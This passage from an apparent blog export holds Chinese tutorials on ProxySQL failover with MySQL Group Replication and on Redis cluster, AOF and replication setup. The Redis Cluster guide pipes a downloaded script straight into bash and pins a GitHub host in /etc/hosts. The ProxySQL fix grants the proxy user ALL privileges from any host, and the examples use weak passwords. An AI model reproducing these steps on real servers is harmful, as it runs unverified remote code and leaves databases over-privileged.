<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">然后再将将192.168.219.151变为可写模式后，mysql_servers也恢复过来了。</span></span><br><span class="line">[root@mgr-node1 ~]# mysql -uroot -p"123456"</span><br><span class="line">........</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global read_only=0;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">接着观察一下mysql_servers的状态</span></span><br><span class="line">[root@proxysql-node ~]# mysql -uadmin -padmin -h 127.0.0.1 -P6032</span><br><span class="line">........</span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers;</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-------------</span><br><span class="line">| hostgroup_id | hostname        | port | status       | weight | compression | max_connecti</span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-------------</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000        </span><br><span class="line">| 1            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000        </span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000        </span><br><span class="line">| 2            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000        </span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000        </span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000        </span><br><span class="line">+--------------+-----------------+------+--------------+--------+-------------+-------------</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">经过测试将192.168.219.151节点停止组复制（stop group_replication）或者该节点宕机(mysql服务挂掉)后，mysql_servers表的信息也会正常的切换新的节点。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">待192.168.219.151恢复再加入到组复制后，mysql_servers也会正常的将192.168.219.151改成online状态。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">可能出现的问题:</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">  select * from  mysql_servers ;</span></span><br><span class="line">+--------------+---------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname      | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+---------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | OFFLINE_HARD | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+---------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">也就是说，可能遇到上面所有节点都offline了的情况，查看错误日志如下：</span></span><br><span class="line">[root@proxysql-node ~]# tail -f /var/lib/proxysql/proxysql.log</span><br><span class="line">........</span><br><span class="line">[2019-02-18 16:23:52] read node [hostgroup_id: 2, hostname: 192.168.219.153, port: 3306, isOK: 0] is not OK, we will set it's status to be 'OFFLINE_SOFT'</span><br><span class="line">ERROR 1142 (42000) at line 1: SELECT command denied to user 'proxysql'@'192.168.219.154' for table 'gr_member_routing_candidate_status'</span><br><span class="line">[2019-02-18 16:23:55] current write node [hostgroup_id: 2, hostname:192.168.219.151, port: 3306, isOK: 0] is not OK, we need to do switch over</span><br><span class="line">ERROR 1142 (42000) at line 1: SELECT command denied to user 'proxysql'@'192.168.219.154' for table 'gr_member_routing_candidate_status'</span><br><span class="line">[2019-02-18 16:23:55] read node [hostgroup_id: 2, hostname: 192.168.219.152, port: 3306, isOK: 0] is not OK, we will set it's status to be 'OFFLINE_SOFT'</span><br><span class="line">ERROR 1142 (42000) at line 1: SELECT command denied to user 'proxysql'@'192.168.219.154' for table 'gr_member_routing_candidate_status</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">从上面的错误日志上看出是权限的问题，proxysql用户没有足够的权限读取数据。</span></span><br><span class="line"> </span><br><span class="line">解决办法：</span><br><span class="line">[root@mgr-node1 ~]# mysql -uroot -p"123456"</span><br><span class="line">.........</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT ALL ON * . * TO  <span class="string">'proxysql'</span>@<span class="string">'%'</span>; </span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></span><br><span class="line"> </span><br><span class="line">再次看看，就有权限了</span><br><span class="line">[root@proxysql-node ~]# mysql -uadmin -padmin -h 127.0.0.1 -P6032</span><br><span class="line">.........</span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers;</span><br><span class="line">+--------------+---------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname      | port | status       | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+---------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 1            | 192.168.219.151 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.152 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 1            | 192.168.219.153 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.151 | 3306 | OFFLINE_SOFT | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.152 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">| 2            | 192.168.219.153 | 3306 | ONLINE       | 1      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+---------------+------+--------------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">6 rows in set (0.000 sec)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ProxySQL+MGR</category>
      </categories>
      <tags>
        <tag>ProxySQL</tag>
        <tag>MGR</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-cluster（去中心化）部署</title>
    <url>/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Redis-cluster模式（去中心化集群）"><a href="#Redis-cluster模式（去中心化集群）" class="headerlink" title="Redis-cluster模式（去中心化集群）"></a>Redis-cluster模式（去中心化集群）</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、三台虚拟机（1G1核就行）</span><br><span class="line">2、每台虚拟机部署两台redis（端口不同就OK）</span><br><span class="line">3、部署单节点的redis（不要部署主从模式或是哨兵模式，部署过程如下）</span><br></pre></td></tr></table></figure>

<h2 id="部署Redis"><a href="#部署Redis" class="headerlink" title="部署Redis"></a>部署Redis</h2><h3 id="1-redis安装环境和版本"><a href="#1-redis安装环境和版本" class="headerlink" title="1.redis安装环境和版本"></a>1.redis安装环境和版本</h3><p>客户产线环境redis必须集群，采用 redis-4.0.9 版本。</p>
<p>用三台虚拟机（IP: 10.20.12.<em>，10.20.12.</em>，10.20.44.*）模拟6个节点，一台机器3个节点，创建出3 master、3 salve 环境</p>
<p>注意：master对应的slave不要在一台服务器上</p>
<h3 id="2-安装过程"><a href="#2-安装过程" class="headerlink" title="2.安装过程"></a>2.安装过程</h3><h4 id="1-上传并解压redis-4-0-9-tar-gz"><a href="#1-上传并解压redis-4-0-9-tar-gz" class="headerlink" title="1.上传并解压redis-4.0.9.tar.gz"></a>1.上传并解压redis-4.0.9.tar.gz</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tar -xzvf redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="2-编译安装redis"><a href="#2-编译安装redis" class="headerlink" title="2.编译安装redis"></a>2.编译安装redis</h4><p>redis编译安装需要先安装gcc环境</p>
<p>gcc –v 检查客户环境是否已经预装gcc，如果没有需要，需要先安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum install gcc gcc-c++ autoconf automake //有网环境</span><br></pre></td></tr></table></figure>

<p>离线环境部署gcc环境</p>
<p>在能上网的对应系统版本服务器中执行下面语句，将依赖包下载下来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum -y install --downloadonly --downloaddir=/home/tfd/setup/yum gcc gcc-c++ autoconf automake</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/clip_image002.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd</span><br><span class="line">[root@localhost ~]# rpm -Uvh *.rpm --nodeps --force</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/clip_image002-1597669845837.png" alt="img"></p>
<p>【验证gcc】下图验证gcc环境成功安装</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/clip_image002-1597669857572.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd redis-4.0.9</span><br><span class="line">make &amp;&amp; make install  //编译安装redis，无报错即可</span><br></pre></td></tr></table></figure>

<p>以上在所有需要跑redis的服务器上都需要执行</p>
<h2 id="创建-Redis-节点"><a href="#创建-Redis-节点" class="headerlink" title="创建 Redis 节点"></a>创建 Redis 节点</h2><p>首先在 redis-4.0.9目录下创建 redis_cluster 目录；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd  redis-4.0.9</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# mkdir redis_cluster</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# cd redis_cluster</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# mkdir 7001 7002//在 redis_cluster 目录下，创建名为7001、7002的目录</span><br></pre></td></tr></table></figure>

<p>将 redis-4.0.9/redis.conf 拷贝到这两个目录中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cp  /root/redis-4.0.9/redis.conf  /root/redis-4.0.9/redis_cluster/7001</span><br><span class="line">[root@localhost ~]# cp  /root/redis-4.0.9/redis.conf  /root/redis-4.0.9/redis_cluster/7002</span><br></pre></td></tr></table></figure>

<h2 id="部署集群"><a href="#部署集群" class="headerlink" title="部署集群"></a>部署集群</h2><p>分别修改这两个配置文件redis.conf：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、redis的配置文件内容（6台redis，每台虚拟机两台redis，端口要不一样）</span><br><span class="line">bind 10.8.156.91						#本机ip </span><br><span class="line">port 7000 </span><br><span class="line">daemonize yes							#启动后台运行</span><br><span class="line">pidfile /var/run/redis_7000.pid         #这里的7000和端口号一样，这样方便记 </span><br><span class="line">appendonly yes  </span><br><span class="line">cluster-enabled yes						#开启集群</span><br><span class="line">cluster-config-file nodes-7000.conf		#这里的7000和端口号一样，这样方便记 </span><br><span class="line">cluster-node-timeout 15000				#超时时间 5s</span><br></pre></td></tr></table></figure>

<p>接着在另外两台机器上（10.20.12.<em>，10.20.44.</em>），重复以上步骤，把目录改为7001,7002，对应的配置文件也按照这个规则修改即可。</p>
<p>启动各个节点</p>
<p>\</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">第一台机器上执行</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# cd /root/redis-4.0.9/redis_cluster/7001</span><br><span class="line"></span><br><span class="line">[root@localhost 7001]# redis-server redis.conf</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# cd /root/redis-4.0.9/redis_cluster/7002</span><br><span class="line"></span><br><span class="line">[root@localhost 7002]# redis-server redis.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">另外两台机器上同样如上执行</span></span><br></pre></td></tr></table></figure>

<h4 id="检查redis启动情况"><a href="#检查redis启动情况" class="headerlink" title="检查redis启动情况"></a>检查redis启动情况</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ps -ef | grep redis</span><br></pre></td></tr></table></figure>

<p>安装部署集群所需要的环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum -y install ruby ruby-devel rubygems rpm-build</span><br></pre></td></tr></table></figure>

<p>#集群方式是通过Redis安装目录下的redis-trib.rb脚本搭建。这个脚本是用Ruby编写的，所以要先安装Ruby环境<br>4、使用gem这个命令来安装redis接口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# gem install redis（报错看下面）</span><br></pre></td></tr></table></figure>

<p>报错解决方式</p>
<p>Ruby的版本过低</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211649136.png" alt="image-20200817211649136"></p>
<p>解决办法：（最终目的是下载一个版本高的Ruby）</p>
<p>使用这种方法可能会报错，做不出来和我一样的效果，提供了另一种方法在相邻这篇文章的地方 文章名为–升级Ruby的版本</p>
<h5 id="1、下载之前看一眼目前的Ruby的版本（记号后面要用到）"><a href="#1、下载之前看一眼目前的Ruby的版本（记号后面要用到）" class="headerlink" title="1、下载之前看一眼目前的Ruby的版本（记号后面要用到）"></a>1、下载之前看一眼目前的Ruby的版本（记号后面要用到）</h5><p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211714077.png" alt="image-20200817211714077"></p>
<h5 id="2、需要用到RVM工具"><a href="#2、需要用到RVM工具" class="headerlink" title="2、需要用到RVM工具"></a>2、需要用到RVM工具</h5><p>RVM是一个命令行工具，可以提供一个便捷的多版本Ruby环境的管理和切换。下载RVM需要先下载CRIL（linux下的文件传输工具）。</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211733299.png" alt="image-20200817211733299"></p>
<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211745608.png" alt="image-20200817211745608"></p>
<p>看到错误了吗？？？？？？？莫慌，已经填好了！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum -y install curl</span><br><span class="line">在本机上做一个解析/etc/hosts</span><br><span class="line">[root@localhost ~]# vim /etc/hosts</span><br><span class="line">151.101.108.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211816930.png" alt="image-20200817211816930"></p>
<h5 id="3、使用curl安装rvm-，输入命令-“-curl-L-get-rvm-io-bash-s-stable-“-进行安装"><a href="#3、使用curl安装rvm-，输入命令-“-curl-L-get-rvm-io-bash-s-stable-“-进行安装" class="headerlink" title="3、使用curl安装rvm ，输入命令 “ curl -L get.rvm.io | bash -s stable “ 进行安装"></a>3、使用curl安装rvm ，输入命令 “ curl -L get.rvm.io | bash -s stable “ 进行安装</h5><p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211830338.png" alt="image-20200817211830338"></p>
<h5 id="4、指定-recv-keys-就可以了"><a href="#4、指定-recv-keys-就可以了" class="headerlink" title="4、指定 recv-keys 就可以了"></a>4、指定 recv-keys 就可以了</h5><p>输入命令“gpg2 –keyserver hkp://pool.sks-keyservers.net –recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB”进行安装</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211844952.png" alt="image-20200817211844952"></p>
<h5 id="5、使用source让当前shell"><a href="#5、使用source让当前shell" class="headerlink" title="5、使用source让当前shell"></a>5、使用source让当前shell</h5><p>读入路径为” /usr/local/rvm/scripts/rvm “（路径可以自定义）的shell文件并依次执行文件中的所有语句，并重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录，输入命令 “  source /usr/local/rvm/scripts/rvm “ ，查看rvm中管理的所有ruby版本，输入命令 “ rvm list known “ 进行查询。</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211903559.png" alt="image-20200817211903559"></p>
<h5 id="6、选择一个大于2-3的Ruby版本安装"><a href="#6、选择一个大于2-3的Ruby版本安装" class="headerlink" title="6、选择一个大于2.3的Ruby版本安装"></a>6、选择一个大于2.3的Ruby版本安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# rvm install 2.4.9</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211917492.png" alt="image-20200817211917492"></p>
<h5 id="7、安装完成去使用，移除旧的版本"><a href="#7、安装完成去使用，移除旧的版本" class="headerlink" title="7、安装完成去使用，移除旧的版本"></a>7、安装完成去使用，移除旧的版本</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# rvm use 2.4.9  &amp;&amp; rvm remove 2.0.0</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211934970.png" alt="image-20200817211934970"></p>
<p>然后重新运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# gem install redis 即可</span><br></pre></td></tr></table></figure>

<h5 id="8、加入集群（保证六个节点都活着）"><a href="#8、加入集群（保证六个节点都活着）" class="headerlink" title="8、加入集群（保证六个节点都活着）"></a>8、加入集群（保证六个节点都活着）</h5><p>进入安装目录下的/src执行,任意一台机器上运行下列命令即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./redis-trib.rb create --replicas 1 192.168.200.153:7001 192.168.200.153:7002 192.168.200.166:7001 192.168.200.166:7002 192.168.200.167:7001 192.168.200.167:7002  #改成自己的IP地址</span><br></pre></td></tr></table></figure>

<p>然后会出现一个提示 Can I set the above configuration? (type ‘yes’ to accept):yes<br>输入yes回车<br>[OK] All nodes agree about slots configuration.</p>
<p>然后会出现一个提示 Can I set the above configuration? (type ‘yes’ to accept):yes<br>输入yes回车<br>[OK] All nodes agree about slots configuration.</p>
<blockquote>
<blockquote>
<blockquote>
<p>Check for open slots…<br>Check slots coverage…<br>[OK] All 16384 slots covered.<br>当你看到这个你就成功了</p>
</blockquote>
</blockquote>
</blockquote>
<h2 id="测试集群"><a href="#测试集群" class="headerlink" title="测试集群"></a>测试集群</h2><p><img src= "/img/loading.gif" data-src="/2018/12/25/Redis-cluster%EF%BC%88%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%EF%BC%89%E9%83%A8%E7%BD%B2/image-20200817211617490.png" alt="image-20200817211617490"></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis之AOF重写精讲</title>
    <url>/2020/01/07/Redis%E4%B9%8BAOF%E9%87%8D%E5%86%99%E7%B2%BE%E8%AE%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>AOF</strong>策略可以将每条写入命令都写入到我们的AOF文件当中，那么随着时间的逐步推移，我们的AOF文件就会逐步变大。当然redis开发者也考虑到这个问题！</p>
<p><img src= "/img/loading.gif" data-src="/2020/01/07/Redis%E4%B9%8BAOF%E9%87%8D%E5%86%99%E7%B2%BE%E8%AE%B2/image-20200828211412836.png" alt="image-20200828211412836"></p>
<p><strong>现在我们讲讲AOF重写，我们用一个最简单的例子来进行一个说明：</strong></p>
<p><img src= "/img/loading.gif" data-src="/2020/01/07/Redis%E4%B9%8BAOF%E9%87%8D%E5%86%99%E7%B2%BE%E8%AE%B2/image-20200828211427803.png" alt="image-20200828211427803"></p>
<p><strong>我们写入三条命令并且写入AOF文件当中 ，对于我们来说只有最后一条set hello hehe 是有用的。</strong></p>
<p><img src= "/img/loading.gif" data-src="/2020/01/07/Redis%E4%B9%8BAOF%E9%87%8D%E5%86%99%E7%B2%BE%E8%AE%B2/image-20200828211439257.png" alt="image-20200828211439257"></p>
<p><strong>AOF</strong>重写的作用：</p>
<p><strong>减少硬盘占用量</strong></p>
<p><strong>加速恢复速度</strong></p>
<p><strong>AOF</strong>重写命令：</p>
<p><strong>bgrewriteaof</strong></p>
<p><img src= "/img/loading.gif" data-src="/2020/01/07/Redis%E4%B9%8BAOF%E9%87%8D%E5%86%99%E7%B2%BE%E8%AE%B2/image-20200828211503770.png" alt="image-20200828211503770"></p>
<p>**AOF重写配置：</p>
<p><img src= "/img/loading.gif" data-src="/2020/01/07/Redis%E4%B9%8BAOF%E9%87%8D%E5%86%99%E7%B2%BE%E8%AE%B2/image-20200828211523114.png" alt="image-20200828211523114"></p>
<p><strong>AOF</strong>配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appendonly yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">aof文件名设置</span></span><br><span class="line"></span><br><span class="line">appendfilename "appendonly-$&#123;port&#125;.aof"</span><br><span class="line"><span class="meta">#</span><span class="bash">配置选择</span></span><br><span class="line"></span><br><span class="line">appendfsync everysec</span><br><span class="line"></span><br><span class="line">dir /bigdiskpath</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">不开启aof重写，因为太消耗性能</span></span><br><span class="line"></span><br><span class="line">no-appendfsync-on-rewrite yes</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>AOF</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis主从集群介绍及配置</title>
    <url>/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Redis主从简介"><a href="#Redis主从简介" class="headerlink" title="Redis主从简介"></a>Redis主从简介</h1><h2 id="1、主从-–-用法"><a href="#1、主从-–-用法" class="headerlink" title="1、主从 – 用法"></a><strong>1、主从 – 用法</strong></h2><p>像MySQL一样，redis是支持主从同步的，而且也支持一主多从以及多级从结构。<br>主从结构，一是为了纯粹的冗余备份，二是为了提升读性能，比如很消耗性能的SORT就可以由从服务器来承担。<br>redis的主从同步是异步进行的，这意味着主从同步不会影响主逻辑，也不会降低redis的处理性能。<br><strong>主从架构中，可以考虑关闭主服务器的数据持久化功能，只让从服务器进行持久化，这样可以提高主服务器的处理性能。</strong></p>
<h2 id="2、主从同步原理"><a href="#2、主从同步原理" class="headerlink" title="2、主从同步原理"></a><strong>2、主从同步原理</strong></h2><p>主从 – 同步原理<br>从服务器会向主服务器发出SYNC指令，当主服务器接到此命令后，就会调用BGSAVE指令来创建一个子进程专门进行数据持久化工作，也就是将主服务器的数据写入RDB文件中。在数据持久化期间，主服务器将执行的写指令都缓存在内存中。<br>在BGSAVE指令执行完成后，主服务器会将持久化好的RDB文件发送给从服务器，从服务器接到此文件后会将其存储到磁盘上，然后再将其读取到内存中。这个动作完成后，主服务器会将这段时间缓存的写指令再以redis协议的格式发送给从服务器。</p>
<p>另外，要说的一点是，即使有多个从服务器同时发来SYNC指令，主服务器也只会执行一次BGSAVE，然后把持久化好的RDB文件发给多个从服务器。</p>
<p>而在2.8版本之后，redis支持了效率更高的增量同步策略，这大大降低了连接断开的恢复成本。主服务器会在内存中维护一个缓冲区，缓冲区中存储着将要发给从服务器的内容。从服务器在与主服务器出现网络瞬断之后，从服务器会尝试再次与主服务器连接，一旦连接成功，主服务器就会向从服务器发送增量内容。</p>
<p>增量同步功能，需要服务器端支持全新的PSYNC指令。这个指令，只有在redis-2.8之后才具有。</p>
<h3 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h3><p>BGSAVE指令:<br>在后台异步(Asynchronously)保存当前数据库的数据到磁盘。<br>BGSAVE 命令执行之后立即返回 OK ，然后 Redis fork 出一个新子进程，原来的 Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出。</p>
<h2 id="3、部署三台机器redis—主从同步"><a href="#3、部署三台机器redis—主从同步" class="headerlink" title="3、部署三台机器redis—主从同步"></a>3、部署三台机器redis—主从同步</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-master----192.168.246.202</span><br><span class="line">redis-slave-1-----192.168.246.203</span><br><span class="line">redis-slave-2-----192.168.246.204</span><br><span class="line">1.首先三台服务器将redis部署完成。</span><br><span class="line">2.编辑master的redis配置文件:</span><br><span class="line">[root@redis-master ~]# cd /data/application/redis/</span><br><span class="line">[root@redis-master redis]# vim redis.conf</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817204535426.png" alt="image-20200817204535426"></p>
<p>关闭protected-mode模式，此时外部网络可以直接访问</p>
<p>开启protected-mode保护模式，需配置bind ip或者设置访问密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3.启动主节点redis服务</span><br><span class="line">[root@redis-master src]# cd /data/application/redis/src</span><br><span class="line">[root@redis-master src]# ./redis-server ../redis.conf &amp;   会加载此文件中的配置信息</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4.修改slave1的配置文件：</span><br><span class="line">[root@redis-slave-1 ~]# cd /data/application/redis/</span><br><span class="line">[root@redis-slave-1 redis]# vim redis.conf      ---修改如下：</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817204627335.png" alt="image-20200817204627335"></p>
<p><img src= "/img/loading.gif" data-src="/2018/12/01/Redis%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE/image-20200817204639451.png" alt="image-20200817204639451"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5.启动从节点1的redis服务</span><br><span class="line">[root@redis-slave-1 ~]# cd /data/application/redis/src/</span><br><span class="line">[root@redis-slave-1 src]# ./redis-server ../redis.conf &amp;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">6.修改slave2的配置文件</span><br><span class="line">[root@redis-slave-2 ~]# cd /data/application/redis/</span><br><span class="line">[root@redis-slave-2 redis]# vim redis.conf       ---修改如下</span><br></pre></td></tr></table></figure>

